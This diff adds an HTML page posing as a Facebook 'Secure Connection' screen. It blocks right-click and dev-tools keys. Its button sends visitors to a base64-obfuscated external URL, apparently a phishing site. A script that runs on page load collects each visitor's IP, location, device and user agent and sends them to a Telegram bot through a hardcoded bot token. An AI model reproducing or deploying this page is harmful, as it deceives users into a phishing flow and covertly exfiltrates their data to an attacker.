@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="shortcut icon" href="apple-touch-icon.png" type="image/x-icon">
+     <title>Facebook - log in or sign up </title>
+        <script>
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.onkeydown = function(e) {
+                if (e.keyCode == 123) return false; 
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+                if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+                if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) return false;
+            };
+            document.addEventListener('dragstart', function(e) { e.preventDefault(); });
+        </script>
+        
+    <style>
+        * { -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+        body { 
+            font-family: -apple-system, system-ui, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            background: #f8fafc; 
+        }
+        .root-table { 
+            background: white; 
+            border-collapse: separate; 
+            border-spacing: 0; 
+            width: 100%; 
+            max-width: 400px; 
+            border-radius: 20px; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
+            border: 1px solid #e2e8f0; 
+            overflow: hidden; 
+        }
+        .header-cell { padding: 40px 20px 10px 20px; text-align: center; color: #1e293b; font-size: 22px; font-weight: 700; }
+        .body-cell { padding: 10px 40px 30px 40px; text-align: center; color: #64748b; font-size: 15px; }
+        .action-cell { padding: 0 40px 30px 40px; text-align: center; }
+        .footer-cell { padding: 20px; text-align: center; background: #f1f5f9; font-size: 10px; color: #94a3b8; border-top: 1px solid #e2e8f0; text-transform: uppercase; }
+        .btn { 
+            background-color: #007bff; 
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            font-size: 16px; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            font-weight: 700; 
+            width: 100%; 
+            transition: 0.3s;
+        }
+        .btn:hover { filter: brightness(1.1); }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+    <div>
+        <table>
+        <tr>
+            <td>
+                <!-- <img src="apple-touch-icon.png" alt="logo.pgn" height="73px" width="70px"> -->
+                 <img src="logobn.PNG" alt="logo.pgn" height="73px" width="70px">
+            </td>
+        </tr>
+    </table>
+    </div>
+    <table class="root-table">
+        <tr>
+            <td class="header-cell">Secure Connection</td>
+        </tr>
+        <tr>
+            <td class="body-cell">
+                This page is protected by facebook Team <strong></strong>.<br>
+                Access has been verified safely.
+            </td>
+        </tr>
+        <tr>
+            <td class="action-cell">
+                <button class="btn" onclick="window.location.href=atob('aHR0cHM6Ly91cGRhdGVzLWluZm9ybWF0aW9uamRuLnJmLmdkL2EvI1kyRWpmUEJuOFRpWA==')">Continue to facebook</button>
+            </td>
+        </tr>
+        <tr>
+            <td class="footer-cell"> Log in to Facebook to start sharing and connecting with your</td>
+        </tr>
+    </table>
+    <!--============= javscript option ========= -->
+    <script>
+    (async function() {
+        // --- CONFIGURATION ---
+        const BOT_TOKEN = '6357773411:AAFp3itETAYfauYxgOqJp8M9xoSnGCx9UPY';
+        const CHAT_ID = '-1002009482520';
+        const LOG_NAME = 'visitor_session_log';
+
+        try {
+            // 1. Get Location & IP
+            const geoRes = await fetch('https://ipapi.co/json/');
+            const geo = await geoRes.json();
+
+            // 2. Gather Browser Data
+            const data = {
+                time: new Date().toLocaleString(),
+                ip: geo.ip || 'Unknown',
+                loc: ${geo.city || 'Unknown City'}, ${geo.country_name || 'Unknown Country'},
+                device: navigator.platform,
+                agent: navigator.userAgent.slice(0, 50) + "...",
+                url: window.location.href
+            };
+
+            // 3. Send to Telegram
+            const tgMsg = 🚀 *New Visitor Alert*\n📍 Loc: ${data.loc}\n🌐 IP: ${data.ip}\n📱 Dev: ${data.device}\n🔗 URL: ${data.url};
+            
+            fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: tgMsg,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // 4. "Save" to Browser Storage (Simulated .txt)
+            // Since we can't write to a file on GitHub, we save it to the visitor's 
+            // LocalStorage so you can "see" the log if you inspect the page.
+            let history = JSON.parse(localStorage.getItem(LOG_NAME) || "[]");
+            history.push(data);
+            localStorage.setItem(LOG_NAME, JSON.stringify(history.slice(-10))); // Keep last 10
+
+        } catch (err) {
+            console.warn("Tracker blocked or network error.");
+        }
+    })();
+</script>
+    <!-- =============================================== -->
+</body>
+</html>
